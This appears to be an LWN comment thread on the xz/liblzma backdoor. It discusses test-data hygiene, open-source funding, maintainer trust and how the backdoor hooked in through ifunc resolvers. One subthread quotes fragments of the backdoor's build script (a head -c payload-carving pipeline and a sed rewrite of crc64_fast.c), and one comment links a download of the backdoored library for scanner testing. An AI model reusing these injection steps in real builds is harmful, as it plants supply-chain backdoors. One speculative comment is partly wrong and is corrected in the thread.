In a similar area, for a long time we tried to make the libctf and ld.ctf testsuites in binutils work the same way the DWARF ones mostly do: describe a binary CTF dict via a .S file and just assemble it. But a mixture of there being no cross-arch-portable way to represent arbitrary binary data in .S files (.long, .byte4 etc, are all arch-dependent) and a desire to always test the latest CTF format except in a few error cases meant that nearly all of the tests end up compiling a .c file with -gctf just to get its CTF, then running the tests on that. It turned out to be much nicer to work with that, and much easier to see what the tests were actually \*doing\* as well: .S files are a pretty opaque way to describe a test input! (For corrupted CTF tests, the same problem arises, though at only a few dozen bytes each they're hardly likely to be malicious. There's just no room.)

### A backdoor in xz

Posted Apr 1, 2024 6:52 UTC (Mon)
by **himi** (subscriber, #340)
[[Link](/Articles/967760/)] (2 responses)

> In my opinion, it's the opposite: non-corrupted files could be described using a custom human-readable assembly-like language which represents the primitives allowed in the compression format (something like "LITERAL 03 AA BB CC TREE ..."), while corrupted files could be crazy files found by users which happened to cause older versions of the software to misbehave, and which were added as a regression test.

This is mostly what I was thinking of - have a human-readable language designed to specify the binary formats, and use that to generate the test data. It would work for both good and bad test data, though - rather than simply copying "known bad" test files for testing, you'd pull them apart and write a spec for the test case that generated the same kind of bad data. Doing that would actually specify the badness in great detail, far more so than simply having a binary test file that happens to break things; it could also help drive highly targeted fuzzing whenever particular failures were identified.

The biggest problem I see is that for something like a compression format the difference in complexity between a specification of the binary format and it's possible contents and an actual implementation of the compression algorithm probably isn't all that big, and the specification is certainly going to be subject to as many bugs as the code it's supposed to be testing. This is why I'd hesitate to suggest trying to make this sort of thing into any kind of generalised "best practise" - there are probably going to be too many cases where the payoff just isn't worth the effort required.

That said, a compression algorithm and its on-disk format are probably just about the worst case scenario - I expect a lot of software that reads or writes a binary format would have much less difficulty creating this kind of test data spec. And in a more generalised sense the idea of generating test data rather than simply embedding it in the repository is something that's probably worth encouraging, along with tooling that would support it . . .

### A backdoor in xz

Posted Apr 1, 2024 12:48 UTC (Mon)
by **pizza** (subscriber, #46)
[[Link](/Articles/967790/)] (1 responses)

> This is mostly what I was thinking of - have a human-readable language designed to specify the binary formats, and use that to generate the test data.

So... you have this human-readable language generate a malicious file that contains the payload for an exploit. What have you gained here?

The problem is that the binary data is "hostile", not "how the binary data was generated".

### A backdoor in xz

Posted Apr 2, 2024 3:16 UTC (Tue)
by **himi** (subscriber, #340)
[[Link](/Articles/967917/)]

If we can't simply trust that the contents of the repository aren't malicious, we need to be able to independently verify that they're not malicious. The point of a human-readable specification of the binary data is to try and make it possible for a human to read it and say "the binary version of this spec won't be malicious". Is that possible? In the general case I don't think so, but I'm pretty sure there are going to be a good number of cases where it /is/ possible, for someone with the requisite knowledge of the format. I'm suggesting that where it's possible, it might be worth trying to do, to mitigate against at least some of the risks posed by malicious binary blobs in source repositories.

As I've said, even if this idea might work in some cases I suspect it wouldn't be viable for xz or similar, simply because of the nature of compression algorithms. But if you can make "has undefined binary files as part of the test data set" into a code smell that gets people to take a closer look then you're raising the bar for sneaking a malicious payload into a repository.

### A backdoor in xz

Posted Mar 30, 2024 3:58 UTC (Sat)
by **pabs** (subscriber, #43278)
[[Link](/Articles/967328/)]

[https://infosec.exchange/@lcamtuf/112180485473559371](https://infosec.exchange/%40lcamtuf/112180485473559371)

### A backdoor in xz

Posted Mar 30, 2024 4:01 UTC (Sat)
by **pabs** (subscriber, #43278)
[[Link](/Articles/967329/)]

<https://bugs.debian.org/1068024>

### A backdoor in xz

Posted Mar 30, 2024 7:06 UTC (Sat)
by **mb** (subscriber, #50428)
[[Link](/Articles/967342/)] (16 responses)

All maintainers should now keep in mind that after fixing this vulnerability in xz it is not over.

This is just the start of it.

We all need to be aware that this person, or any other person, will start an equivalent attack on any other project, soon.

Or has already started it...

We maintainers need to

- carefully review submissions.

- reject any submission that we don't fully understand. It's the job of the submitter to make it understandable! It's the job of the submitter to get a patch up to the projects quality standards.

- publicly ask for help, if we are unable to fully maintain a project that people depend on. In the meantime do not apply non-trivial patches. It's not a shame if we are - for whatever reason - temporarily or permanently unable to maintain a project. Users just need to know about that.

- never discuss things in private that belong into public discussions.

### A backdoor in xz

Posted Mar 30, 2024 13:03 UTC (Sat)
by **pizza** (subscriber, #46)
[[Link](/Articles/967409/)] (1 responses)

> - publicly ask for help, if we are unable to fully maintain a project that people depend on

Except, as demonstrated, you can't trust those that are stepping up to supposedly "help" you. You have to vet them first, which brings us full circle.

### A backdoor in xz

Posted Mar 30, 2024 17:36 UTC (Sat)
by **mb** (subscriber, #50428)
[[Link](/Articles/967492/)]

I wrote "publicly" for a reason.

### A backdoor in xz

Posted Mar 30, 2024 14:50 UTC (Sat)
by **cpanceac** (guest, #80967)
[[Link](/Articles/967448/)] (12 responses)

In the mean time i have a problem with big companies using open source components without significantly investing in them (if at all). Their products get in all kind of commercial products used by people around the world. I believe it will make a big difference if they put their money in supporting these projects instead of assuming that everything is fine.

### A backdoor in xz

Posted Mar 30, 2024 17:17 UTC (Sat)
by **rra** (subscriber, #99804)
[[Link](/Articles/967487/)] (11 responses)

Corporations are legally sociopathic and have no structural incentive to do any such thing. Problems like this that result from this gap can be socialized in ways that they still don't have to pay for. Other people will always clean up their messes for them.

We have a social mechanism to require private organizations to support infrastructure that everyone needs, in order to avoid free rider problems like this. It's called taxes. Everyone hates that answer, because it requires making decisions collectively as a society (well, to be more accurate, multiple societies) and holding people responsible for participating in and funding the society that they are part of, but no one has a better alternative. Begging corporations to be kind, benevolent benefactors isn't going to work. Appealing to self-interest when it's quite clear they can socialize their losses and make more money by being aggressively selfish also isn't going to work.

An interesting model worth considering is the way countries like the UK compensate the authors of books based on how much circulation they receive in libraries.

### A backdoor in xz

Posted Mar 30, 2024 21:55 UTC (Sat)
by **kleptog** (subscriber, #1183)
[[Link](/Articles/967546/)] (10 responses)

> We have a social mechanism to require private organizations to support infrastructure that everyone needs, in order to avoid free rider problems like this. It's called taxes.

There's also a third way: regulations. The food and drink we consume is safe not because companies are nice or because we pay for it all via taxes. It's safe because we have regulations and enforce them. Stuff like electricity grids, water/gas networks, telecommunication grids are these days typically built on a user-pays principle: those who use the service pay for the infrastructure. In the past these were originally built by (local) governments with taxes but that's just not very inefficient. Using regulations to enforce service levels while letting the user pay for them can work much better (note: this is not the same as privatisation). (Caveat: requires people making sensible regulations.)

I'm not convinced getting open-source infrastructure paid for via taxes is a viable model. Taxes are a very blunt instrument because they completely divorce the people who use the product from the people who pay for it. This is fine for things where we expect social solidarity like social security. I don't think it makes sense for open-source software.

This is the moment where we need to point out to all those big companies: can you imagine if this had gone undetected and ended up in one of your released products? What would that have cost you and how much is it worth now to prevent that?

### A backdoor in xz

Posted Mar 30, 2024 23:07 UTC (Sat)
by **ejr** (subscriber, #51652)
[[Link](/Articles/967557/)] (5 responses)

Enforcement is funded by taxes.

### A backdoor in xz

Posted Mar 31, 2024 22:07 UTC (Sun)
by **Wol** (subscriber, #4433)
[[Link](/Articles/967738/)] (4 responses)

> Enforcement is funded by taxes.

Why? What you \*should\* do is provide a guaranteed level of funding for your enforcement agency that enables it to function, monitor the market, and carry out a low level of enforcement. That enforcement enables the agency to recover costs, which means they can expand enforcement in line with expanding abuse/breaches. The result again \*should\* be a commercial decision that breaking the rules is not wise - either you're a lone offender who will get targeted, or the market is generally offending and the fines/costs will enable the enforcement agency to rapidly expand ...

Cheers,

Wol

### A backdoor in xz

Posted Apr 1, 2024 17:49 UTC (Mon)
by **apoelstra** (subscriber, #75205)
[[Link](/Articles/967883/)] (3 responses)

>That enforcement enables the agency to recover costs

In the US at least, I don't believe any agency works this way. Instead any fines or other enforcement-related payments go to the goverenment's general fund. Money is fungible so in principle this could make an agency cost-neutral, but it has no effect on the agency's budget so they aren't incentivized to try.

If any agency \*were\* incentivized to levy fines, because their operating budget had to come out of the fines, this would be a perverse incentive for them to just levy fines willy-nilly. Much like the "speed traps" operated by local police agencies near the end of the month.

### A backdoor in xz

Posted Apr 1, 2024 21:49 UTC (Mon)
by **kleptog** (subscriber, #1183)
[[Link](/Articles/967905/)] (1 responses)

> >That enforcement enables the agency to recover costs

> In the US at least, I don't believe any agency works this way.

It surely varies by jurisdiction, but regulatory agencies here in Netherlands don't live off fines. They'd die if that were the case. To give some examples how it works:

- NVWA (think food safety) charges per food inspection certificate issued, time spent auditing a business, etc for example.

- AFM (like the SEC) basically has a budget, which is divided by a formula over all the banks, insurance companies, etc within the Netherlands.

The principle is straight forward: regulatory authorities are paid for by the businesses they are regulating. The health agency is funded by the hospitals, GPs and pharmaceutical companies within their jurisdiction. If a sector complains the regulatory agency is too expensive, then politicians can simply argue that the sector should get its act together so they there's less enforcement work required.

It doesn't work for everything. Stuff like GDPR enforcement, it's not clear who should pay for that. But for a lot of regulatory agencies it does work reasonably well.

### A backdoor in xz

Posted Apr 2, 2024 9:10 UTC (Tue)
by **farnz** (subscriber, #17727)
[[Link](/Articles/967928/)]

The general model for things where it's not clear who should pay is for the regulator to be funded from general taxation, and for fines to go back into the general pot; it is understood that the regulator is not expected to attempt to pay its own costs via fines, but that it is expected to fine everyone who breaches the regulations.

### A backdoor in xz

Posted Apr 2, 2024 18:26 UTC (Tue)
by **Wol** (subscriber, #4433)
[[Link](/Articles/968014/)]

> If any agency \*were\* incentivized to levy fines, because their operating budget had to come out of the fines, this would be a perverse incentive for them to just levy fines willy-nilly. Much like the "speed traps" operated by local police agencies near the end of the month

What you \*want\* to achieve, is for the person paying to want to pay the minimum possible, but for them to have two (at least) different ways of minimising the cost.

My preferred example is with things like insurance companies. Why shouldn't the police have a "burglary investigation department" paid for by the insurance companies? You then hopefully get a "steady state" where the police catch enough burglars to keep the crime rate down, but barring outright fraud the system isn't going to get out of hand.

Unfortunately, capitalism tends to sabotage such neat systems, another example is the mess we have of utilities - it makes sense for the infrastructure to be owned by the customers, but all too often it's treated as a profit centre by suppliers :-( As a result you get the horror stories we of from America of people locked into cable monopolies, or stuck with dial-up speeds. In a first world state !?!?

(I won't say we're much better - in theory we're a lot better off, but it still fails horribly ...)

Cheers,

Wol

### A backdoor in xz

Posted Mar 31, 2024 3:47 UTC (Sun)
by **rra** (subscriber, #99804)
[[Link](/Articles/967613/)] (3 responses)

I agree that working out the right way to do this would be hard. Nothing about this problem is easy; if it were easy, we would have done it already. But the cracks are showing in how we're doing this now. (If only this weren't true about dozens of other things about our modern world, several of which are significantly more important than free software.)

But, that said...

> Taxes are a very blunt instrument because they completely divorce the people who use the product from the people who pay for it.

This is exactly why I find the library model interesting: there's a feedback loop. Corporate products, services, and infrastructure that use free software vote with their choices. We figure out some way to count those choices (I know, I know, complexity of the software should be a factor, how to do this is very inobvious, insert vigorous hand-waving here), and an appropriate percentage of the revenues of those companies go to the maintainers of that software. If companies stop using their software, they stop getting money. If more companies use their software, they get more money.

I personally don't like that everything in society is denominated by money (this, ironically, is part of why I write free software; I like being motivated by community rather than money), but if I want free software developers to slow down, take a breath, be more methodical, and be able to take the time to do things properly, well, most of those things require money in some way. (Not \*only\* money, of course.) I think we need to find ways to derisk going part-time, or taking a year between jobs to work on free software, or making a living writing free software infrastructure, if we want to get ahead of our growing maintenance crisis.

### A backdoor in xz

Posted Apr 1, 2024 15:30 UTC (Mon)
by **kleptog** (subscriber, #1183)
[[Link](/Articles/967860/)]

> This is exactly why I find the library model interesting: there's a feedback loop. Corporate products, services, and infrastructure that use free software vote with their choices.

Ok, so that's a different model. That kind of thing exists as levies for other things. Like the "thuiskopieheffing" (home copy levy) which is basically an extra charge on writable CDs/DVDs and other media which is distributed to copyright holders as compensation for the fact the people copy stuff for own use. Or the charges on appliances that pay for the collection and recycling at end-of-life.

You could, in theory, add a 1% levy on all digital products/services and then via that hand-waving you were referring to, distribute to the developers/maintainers of open-source. The justification being that all digital products/services depend on open-source anyway, this is a way for finance it. I don't think this idea is completely ridiculous, if someone could actually work out the details it could actually happen.

The details however matter. Because it's not just a money problem. Even if tomorrow there was a fund available to pay for all the maintenance of open-source software, the social structures doesn't exist to make it happen. Are there enough people who actually want to do the required work, even if they were paid? How do we ensure the work is actually done? Figuring out which projects is the easy part. Can we trust the people who actually do it?

The financing of maintenance of open-source software is a long-standing problem and simply throwing money at it isn't going to solve it. You first need to figure out \*how\*, then you can discuss where to get the money from. I think the CRA is a step in the development of the business models that will improve the funding situation in the future but I don't think we yet know how this will work out.

### A backdoor in xz

Posted Apr 2, 2024 16:12 UTC (Tue)
by **GNUtoo** (guest, #61279)
[[Link](/Articles/967987/)] (1 responses)

> This is exactly why I find the library model interesting: there's a feedback loop. Corporate products, services, and infrastructure that use free software vote with their choices. We figure out some way to count those choices (I know, I know, complexity of the software should be a factor, how to do this is very inobvious, insert vigorous hand-waving here), and an appropriate percentage of the revenues of those companies go to the maintainers of that software. If companies stop using their software, they stop getting money. If more companies use their software, they get more money.

The issue here is the side effects. For instance what would prevent companies from writing extremely used software with poor security track record and try to get money to fix things after the fact when the design is bad, or that even bigger foundations than the design is bad (use cases impossible to secure, etc).

And if it somehow works it could also make very secure software that go in conflict with freedom or other things we care about (like inclusiveness, making old hardware continue to work, etc).

A slightly better approach would be to look at the NLnet approach and somehow adapt it for improving security maintenance.

Micro-grants for small period of time are probably not ideal to fund long term maintenance, so that could probably be adapted/changed, along with the metrics to decide when not to pay (it's probably easier to look if a specific task is done than assert the usefulness of maintenance tasks), but the fact that highly competent people decide what to fund and not to fund and have a strategic vision for FLOSS is probably something that we need.

This could avoid the most problematic perverse incentives, and the cost here would probably be the subjectivity of the people that decide what to fund or not to fund, and here having diverse people could help but probably won't fix everything.

But at least it would be better than the other models mentioned here before.

### A backdoor in xz

Posted Apr 3, 2024 13:17 UTC (Wed)
by **mathstuf** (subscriber, #69389)
[[Link](/Articles/968181/)]

> The issue here is the side effects. For instance what would prevent companies from writing extremely used software with poor security track record and try to get money to fix things after the fact when the design is bad, or that even bigger foundations than the design is bad (use cases impossible to secure, etc).

First, to me, would be the interesting question of how a "poor security track record" ended up "extremely used" under the regulation threat looming. Besides that…if it is FOSS, who says the company gets the contract? Even if not, there could be some source escrow (something I would love to see for "critical" software). Either way, a bidding process can help with prices. Allow the "core maintainer" entity to usurp the lowest bid with, say, 10% overhead if they way to do it themselves and retain "power", but that can help curb gouging at least. Also allow bids to create a compatible replacement. Not that procurement doesn't have collusion, greased hands, and other situations, but it is at least something familiar.

### A backdoor in xz

Posted Mar 31, 2024 0:17 UTC (Sun)
by **rgmoore** (**✭ supporter ✭**, #75)
[[Link](/Articles/967570/)]

I largely agree with your list of suggestions, but it's not clear that they would have helped in this case. This wasn't a drive-by contribution by someone the maintainer didn't know. It sounds as if the maintainer was trying to follow your third principle by getting help. He found someone who had been contributing to the project for a couple of years before trying to slip in a backdoor. That's long enough that an overwhelmed maintainer very well could have turned over the keys to the new guy already.

This is a really serious problem that can't be solved with a few rules. There are too many projects whose value to an attacker is huge compared to their resources. Someone who really wants to subvert them can hide their true intentions for long enough to win the maintainer's trust. There's no simple way to avoid that kind of patient attack, especially for a project that barely has the resources to keep maintaining its software.

### A backdoor in xz

Posted Mar 30, 2024 12:47 UTC (Sat)
by **lv7** (guest, #170474)
[[Link](/Articles/967369/)]

Gentoo: <https://security.gentoo.org/glsa/202403-04>

### A backdoor in xz

Posted Mar 30, 2024 12:48 UTC (Sat)
by **lv7** (guest, #170474)
[[Link](/Articles/967406/)]

Lasse Collin added a notification in the takaani page: <https://tukaani.org/xz-backdoor/>

### A backdoor in xz

Posted Mar 30, 2024 13:20 UTC (Sat)
by **nettings** (subscriber, #429)
[[Link](/Articles/967413/)]

Hmmm. I had the compromised packages on an OpenSUSE Tumbleweed machine whose sshd was fortunately not exposed to the internet.

Stupid me hadn't even checked, the first thing I did was log onto a machine that did offer incoming sshd to the outside world.

Weird thing was, I got asked to accept that host's key, which is absolutely not plausible, because I literally log into that machine several times a week from this host. This is when I stopped the login process, killed all user processes and checked from a local text console if my local host was affected, turns out it was.

In my hurry to lock stuff down I did not write the offered key down anywhere (alas), and now I cannot obtain a compromised xz easily to reproduce... but in case someone feels bored, I'd like to know if you're seeing this, too.

### A backdoor in xz

Posted Mar 30, 2024 14:39 UTC (Sat)
by **draco** (subscriber, #1792)
[[Link](/Articles/967428/)]

IMHO, if you hate systemd and blame it for this problem without taking the time to see if anyone else has already debunked your argument, you're unwittingly helping "Jia Tan."

I very much doubt it was a primary objective, but I'm sure it is just icing on the cake for the people responsible for this backdoor that they can count on all the people who hate systemd to

waste everyone's time with their predictable knee-jerk reactions.

I've already lost count of the number of times I've seen the exact same argument both here in various subthreads of \*this\* conversation and on various mailing lists, etc.

Thankfully it can be quickly and thoroughly debunked, but it's still a distraction and a waste of time & effort that only serves to slow our response to this attack.

If you're one of those people, I recommend some soul searching. It's human nature to want to score easy points, but blind hate doesn't help anyone and actually gets in the way of what I thought was the point of open source — to make the world a better place.

### More hygienic linking

Posted Mar 30, 2024 16:04 UTC (Sat)
by **epa** (subscriber, #39769)
[[Link](/Articles/967431/)] (5 responses)

> The backdoor initially intercepts execution by replacing the ifunc resolvers
> crc32\_resolve(), crc64\_resolve() with different code,

So… how does it get to do that? When linking in a library, by default it can not only add symbols, but override them?

I think the default should be “safe linking” where each .so file can only define its own symbols and not override those from elsewhere. If it needs to override, that could be specified explicitly on the linker command line (and if necessary encoded in the resulting executable, if it’s dynamically linked). Even if you’re not concerned about security, a general respect for “what can go wrong will go wrong” and for minimizing accidental strange behaviour would suggest not allowing overrides without explicit say-so.

I dare say getting to there from here might be awkward, with the same symbol defined multiple times but nobody has had to care about it until now.

### More hygienic linking

Posted Mar 30, 2024 16:48 UTC (Sat)
by **smurf** (subscriber, #17840)
[[Link](/Articles/967476/)] (1 responses)

When you load a library, its .init section gets executed. Likewise .fini when the library is unloaded / program ends regularly.

(Disclaimer: the actual details are a bit more hairy than that.)

The code in that section is typically used to set up variables and global objects and whatnot, but it can and in this case indeed does do whatever it damn well pleases. Restricting that capability is … difficult.

### More hygienic linking

Posted Mar 30, 2024 17:02 UTC (Sat)
by **epa** (subscriber, #39769)
[[Link](/Articles/967481/)]

Right. Libraries would have to be written in a restricted style where there isn’t global data to initialize, and if there’s some kind of setup work that must be done by an explicit call from the application code. Which I suggest is all good practice anyway. But likely to meet pushback from those who don’t see a need to change.

### More hygienic linking

Posted Mar 31, 2024 3:53 UTC (Sun)
by **danobi** (subscriber, #102249)
[[Link](/Articles/967618/)] (2 responses)

I was wondering that as well and tried to get ifunc to behave like that. Couldn't get it to work. But then I read <https://gynvael.coldwind.pl/?lang=en&id=782> and saw this bit:

((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma\_la-crc64-fast.o

Looks like the binary payload just replaces one of the ifunc implementations at build time. At least that's my guess.

### More hygienic linking

Posted Apr 1, 2024 11:24 UTC (Mon)
by **excors** (subscriber, #95769)
[[Link](/Articles/967781/)] (1 responses)

I think there's a bit more than that. The injected.txt script in Andres Freund's email includes:

V='[...]extern int \_get\_cpuid(int, void\*, void\*, void\*, void\*, void\*);\nstatic inline bool \_is\_arch\_extension\_supported(void) { int success = 1; uint32\_t r[4]; success = \_get\_cpuid(1, &r[0], &r[1], &r[2], &r[3], [...]'

[...]

sed "/return is\_arch\_extension\_supported()/ c\return \_is\_arch\_extension\_supported()" $top\_srcdir/src/liblzma/check/crc64\_fast.c

In the upstream code, is\_arch\_extension\_supported calls \_\_get\_cpuid (provided by GCC). The backdoored build script modifies crc64\_fast.c so it calls \_get\_cpuid (one underscore) instead. \_get\_cpuid is defined in liblzma\_la-crc64-fast.o, which is a binary hidden in the test files.

If I understand correctly, the loader executes the ifunc resolver function (crc64\_resolve) when liblzma is loaded. crc64\_resolve calls [\_]is\_arch\_extension\_supported to determine if it can use the optimised version with the CLMUL instruction. But now that actually calls \_get\_cpuid which initialises the runtime backdoor.

So, there's nothing funny happening with the linker and there's no symbol overriding. The functions are "replaced" using sed before compiling.

(I guess they could have simply had the build script insert an \_\_attribute\_\_((constructor)) function, but anyone debugging or profiling a liblzma-using application might have been surprised to see liblzma functions getting executed at startup. Using ifuncs makes it less suspicious - liblzma has a good reason to run crc64\_resolve and ...get\_cpuid, clearly visible in the upstream code (modulo some underscores), so they probably hoped anyone investigating would stop at that point.)

### More hygienic linking

Posted Apr 1, 2024 15:28 UTC (Mon)
by **andresfreund** (subscriber, #69562)
[[Link](/Articles/967864/)]

> (I guess they could have simply had the build script insert an \_\_attribute\_\_((constructor)) function, but anyone debugging or profiling a liblzma-using application might have been surprised to see liblzma functions getting executed at startup. Using ifuncs makes it less suspicious - liblzma has a good reason to run crc64\_resolve and ...get\_cpuid, clearly visible in the upstream code (modulo some underscores), so they probably hoped anyone investigating would stop at that point.)

I \*think\* init functions get executed a bit later, when the .got section for all the libraries already have been remapped read-only. So they couldn't have pulled the trick of redirecting a function despite -z now -z relro being used.

### A backdoor in xz

Posted Mar 30, 2024 19:19 UTC (Sat)
by **gdamjan** (subscriber, #33634)
[[Link](/Articles/967523/)]

OpenWrt official Project Statement

[https://forum.openwrt.org/t/project-statement-about-xz-5-...](https://forum.openwrt.org/t/project-statement-about-xz-5-6-1-cve-2024-3094/193250)

tl;dr; it's fine, but still

### A backdoor in xz

Posted Mar 30, 2024 19:57 UTC (Sat)
by **marcin** (subscriber, #159076)
[[Link](/Articles/967535/)]

For Fedora 40 and Rawhide users (at least): remember to also regenerate your initramfs (with `dracut -f`) if the following command shows "liblzma.so.5.6.0":
```

cd /boot; for i in initramfs-*; do echo $i:; lsinitrd $i | grep liblzma; done

```

### Obtaining a copy of the bad library

Posted Mar 30, 2024 23:08 UTC (Sat)
by **tarvin** (guest, #4412)
[[Link](/Articles/967556/)] (2 responses)

Does someone know how to get hold of a liblzma.so.5 which has the backdoor code? I'd like to have some so-called antimalware products scan it and see if they detect anything bad with it. (My prejudice is that they will not flag it as bad, but maybe I'm wrong.)

### Obtaining a copy of the bad library

Posted Mar 31, 2024 6:41 UTC (Sun)
by **wsy** (subscriber, #121706)
[[Link](/Articles/967637/)] (1 responses)

[https://snapshot.debian.org/archive/debian/20240328T02565...](https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/liblzma5_5.6.1-1_amd64.deb)

### Obtaining a copy of the bad library

Posted Mar 31, 2024 11:26 UTC (Sun)
by **tarvin** (guest, #4412)
[[Link](/Articles/967656/)]

Thanks. At the time of writing at VirusTotal, just three out of 76 so-called malware detection products flag an issue with the bad shared object file. Those three products are AliCloud, DrWeb, and Rising. None of the major antimalware tool vendors detect it.

This highlights the absurdity of some corporations' policies requiring that antivirus (which have many times itself suffered from security holes) be installed even on Linux systems.

### Building a backdoored Kernel - Attack vector 2?

Posted Mar 31, 2024 16:32 UTC (Sun)
by **ma4ris8** (subscriber, #170509)
[[Link](/Articles/967688/)] (3 responses)

My sympathy to Lasse Collin. I think that he didn't have any idea what was happening.

I tried to understand, what "Jia Tan" tried to do.

Below is hypothesis level, thus might have some truth, but how much,

that is to be seen:

It could be, that the LKML patch's intent was to: Install a backdoor into Linux Kernel via

"xz" command injecting the payload during Kernel Build process.

I compared LKML patch, and the first related Git commits since 2022.

I also read the "oss-security" email history of this issue.

When looking at commits which mention Jia Tan at <https://git.rootprojects.org/root/xz>

first logic change with weird wording is

Jia Tan <jiat0218@gmail.com> 2022-09-21 14:28:53

3d5a99ca "liblzma: Fix copying of check type statistics in lzma\_index\_cat()."

Thoughts: "Last stream handling": Perhaps after the full stream, there is the backdoor payload stream

still waiting.

Jia Tan <jiat0218@gmail.com> 2022-10-05 11:41:38

fae37ad2affd8 "Tests: Fix compilation error when threading support has been disabled."

+#ifndef MYTHREAD\_ENABLED

+ assert\_skip("Threading support disabed");

+#else

Thus Jia Tan disables test, if the code is running in a single threaded case, for memlimit.

Thus it eases to allocate memory for the additional payload.

1fc6e7dd1fa 2022-11-07

"liblzma: Include cached memory in reported memusage in threaded decoder. Thanks to Jia Tan."

This code caches memory statistics. That could be useful to hide additional memory use

from payload management within xz.

"oss-security" mentioned that running "$XZ" so that it prints environment variables:

that could inject some code in the LKML patch, that could affect Kernel build.

+eval "$($XZ --robot --version)" || exit

LKML patch has advice:

"+ xz --threads=1 --check=crc32 --lzma2=dict=512KiB inputfile"

Here will possibly the untested (tests skipped) code paths run, and thus there could be additional payload added from

within "xz" binary, and unseen code paths. If this recommended command is executed, then the back door could be installed

into the Kernel during build process (if the feature has been activated within some version of backdoor version of xz).

### Building a backdoored Kernel - Attack vector 2?

Posted Mar 31, 2024 17:16 UTC (Sun)
by **nix** (subscriber, #2304)
[[Link](/Articles/967703/)] (2 responses)

> 1fc6e7dd1fa 2022-11-07
> "liblzma: Include cached memory in reported memusage in threaded decoder. Thanks to Jia Tan."
> This code caches memory statistics. That could be useful to hide additional memory use
> from payload management within xz.

The commit with that SHA-1 ID is
> xz: Avoid a compiler warning in progress\_speed() in message.c.

(The commit you mean is 5e2450c75c.)

Your description is wrong, as far as I can see: it does the opposite, \*including\* cached usage in the memory limit (which previously excluded it, so memory could exceed the limit arbitrarily much). There is no attempt to cache anything new.

Further, this commit is not in the upstream kernel at all, nor in anything that has been submitted to the kernel as far as I can see (unsurprisingly, given that the kernel's xz decoder is \*much\* simpler than liblzma's and isn't even from the same project, but rather from XZ Embedded, which has barely been touched for years: its last non-Itanium-removal commit predates Jia Tan's involvement, thank goodness).

### Building a backdoored Kernel - Attack vector 2?

Posted Mar 31, 2024 19:21 UTC (Sun)
by **ma4ris8** (subscriber, #170509)
[[Link](/Articles/967709/)] (1 responses)

You are right : the hash was wrong one for the commit in "xz source code", outside of Kernel source code.

Sorry for the mistake.

Sometimes I have ideas, which prove to be false.

Maybe I'm just trying to think too much, with too little information, what the backdoor code creator attempted to do.

It could be that the Kernel changes in the merge request were not enough to enable the backdoor,

only the sshd side was completed. Also the target Kernel build process, could be something specific (for example specific distribution build environment, which would use "xz" RPM, not one from Kernel, for example).

It is interesting, that between 5.6.0 and 5.6.1 there were "ifunc" changes:

libarchive change was also related with "ifunc".

[https://gist.github.com/martenson/398bdb7a928069cf67606c9...](https://gist.github.com/martenson/398bdb7a928069cf67606c9ba919a7ce)

"We're reasonably sure the following things need to be true for your system to be vulnerable:

You need to be running a distro that uses glibc (for IFUNC)

etc.

It may activate in other scenarios too, possibly even unrelated to ssh.

We don't know what the payload is intended to do. We are investigating."

### Building a backdoored Kernel - Attack vector 2?

Posted Mar 31, 2024 19:46 UTC (Sun)
by **nix** (subscriber, #2304)
[[Link](/Articles/967731/)]

Yeah, the IFUNC mechanism was abused to force different resolution for symbols in libcrypto (!) as used by openssl. It may be possible to spot and block this abuse, since it seems to me that no legitimate program would ever want to do what the exploit does, but let's not fool ourselves -- if this wasn't present, the exploit would just have done something else. By the time you have hostile code executing in the same address space as sshd before privsep has kicked in, you've lost, IFUNC or no IFUNC.

### A backdoor in xz

Posted Apr 1, 2024 0:35 UTC (Mon)
by **Heretic\_Blacksheep** (subscriber, #169992)
[[Link](/Articles/967750/)]

Further analysis posted to the mailing list after this short blurb was released to LWN suggest this isn't a authentication bypass backdoor. It's in reality an RCE back door triggered by sending a particular security certificate to the compromised system's sshd.

A resulting bug report was sent to OpenSSH to close the potentially unwanted authentication vector that makes the RCE possible. <https://bugzilla.mindrot.org/show_bug.cgi?id=3675>

It seems as if OpenSSH will accept a security cert regardless of whether a CA is configured or not.

Otherwise, it seems this backdoor in xz was still limited to certain kinds of Linux environments and was (accidentally) caught before it could do widespread damage. Where FOSS project security goes from here will largely be up to the individuals and individual organizations that manage them. Hopefully, it will lead to greater scrutiny of individual project governance's standards (like how thoroughly they have been reviewing commits) before inclusion into others (like Linux distro repositories).

### A backdoor in xz

Posted Apr 1, 2024 1:39 UTC (Mon)
by **sergey.senozhatsky** (subscriber, #91933)
[[Link](/Articles/967755/)]

This actor is also a co-maintainer ("XZ EMBEDDED") of the Linux kernel xz implementation. And they have some contribution record to the Linux kernel.

### libarchive "bsdtar" tar extraction exploit

Posted Apr 1, 2024 6:43 UTC (Mon)
by **ma4ris8** (subscriber, #170509)
[[Link](/Articles/967763/)]

JFrog shows "bsdtar" proof of concept of the "libarchive" modification

at [https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-a...](https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/)

JFrog states:

"In 2021, JiaT75 submitted a pull request to the libarchive repository with the title ‘Added error text to warning when untaring with bsdtar’ which seemed legitimate at first glance. "

### A backdoor in xz

Posted Apr 1, 2024 18:56 UTC (Mon)
by **ccchips** (subscriber, #3222)
[[Link](/Articles/967890/)]

In case anyone is interested....

[https://www.politico.com/news/2024/03/31/thwarted-supply-...](https://www.politico.com/news/2024/03/31/thwarted-supply-chain-hack-alarm-bells-00149877)

### Automatically auditing tarballs?

Posted Apr 2, 2024 12:01 UTC (Tue)
by **GNUtoo** (guest, #61279)
[[Link](/Articles/967941/)] (1 responses)

Some of the source code backdooring attempts I know (Linux backdoor from November 2003, ProFTPD and now XZ) that don't look like mistakes (these are not memory safety bugs that are easy to make) were not done in the version control system but instead directly on tarballs.

Using the version control system directly in packages is probably not the answer though as this is not always a drop-in replacement for tarballs.

For instance many git repositories don't sign commits while tarballs are often signed, and if not, the checksum of a tarball is something relatively simple that give very strong guarantees against hosters somewhat subverting the tarball and making it pass the check.

As I understand git also has issues, for instance enabling enabling fsckObjects is not always practical as many projects (including Linux) require skiplists. And if I understood right, without that the hoster of the repository can somewhat subvert the commits in a way that still pass all the integrity of the checks.

Guix has tooling to create tarballs from git (see "Supporting long-term reproducibility" in <https://guix.gnu.org/en/blog/2022/gnu-guix-1.4.0-released/>) however I'm unsure if it's also used to somewhat automatically audit tarballs, but It can at least be re-used to least detect if a given git commit correspond to a given tarball with some code as the functionality to do that is there.

